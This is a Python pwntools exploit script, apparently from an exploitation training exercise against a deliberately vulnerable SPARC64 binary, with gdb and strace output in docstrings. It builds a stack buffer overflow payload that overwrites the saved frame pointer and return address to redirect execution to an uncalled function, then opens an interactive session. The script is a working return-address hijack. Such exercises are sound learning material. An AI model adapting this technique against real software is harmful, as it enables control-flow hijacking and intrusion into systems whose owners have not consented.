#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000000100820 <+0>:	save  %sp, -304, %sp
...
   0x000000000010084c <+44>:	add  %fp, 0x77f, %g1
   0x0000000000100850 <+48>:	mov  0x100, %o2
   0x0000000000100854 <+52>:	mov  %g1, %o1
   0x0000000000100858 <+56>:	clr  %o0
   0x000000000010085c <+60>:	call  0x202180 <read@plt>
...
   0x000000000010086c <+76>:	return  %i7 + 8
   0x0000000000100870 <+80>:	nop 
End of assembler dump.
(gdb) b *0x000000000010085c
Breakpoint 1 at 0x10085c: file src/02-overwrite-ret.c, line 15.
(gdb) c
Continuing.

Breakpoint 1, 0x000000000010085c in vulnerable () at src/02-overwrite-ret.c:15
15		read(STDIN_FILENO, &buffer[0], 256);
(gdb) p &buffer[0]
$1 = 0x4000800a30 ""
(gdb) p/x $fp+0x7ff
$2 = 0x4000800ab0
"""

"""
$ qemu-sparc64 -L /usr/sparc64-linux-gnu/ -strace ./bin/sparc64/02-overwrite-ret
...
29248 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
29248 mmap(NULL,2531064,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x000000400094e000
...
"""

import struct
import sys

from pwn import *

context(arch='sparc64', os='linux', endian='big', word_size=64)

binary_path = './bin/sparc64/02-overwrite-ret'
libc_path = '/usr/sparc64-linux-gnu/lib/libc-2.27.so'

buffer_addr = 0x4000800a30
main_frame_addr = 0x4000800ab0
libc_addr = 0x000000400094e000

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

libc = ELF(libc_path)
libc_data_header = libc.get_section_by_name('.data').header
libc_rw_addr = libc_addr + libc_data_header.sh_addr + ((libc_data_header.sh_size / 2) & ~0x8)

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (main_frame_addr - buffer_addr)
payload += 'b' * (14 * 8)
payload += p64(libc_rw_addr) # fp -> sp
payload += p64(not_called_addr - 8) # i7 -> pc

p.readuntil('> ')
p.write(payload)
p.interactive()
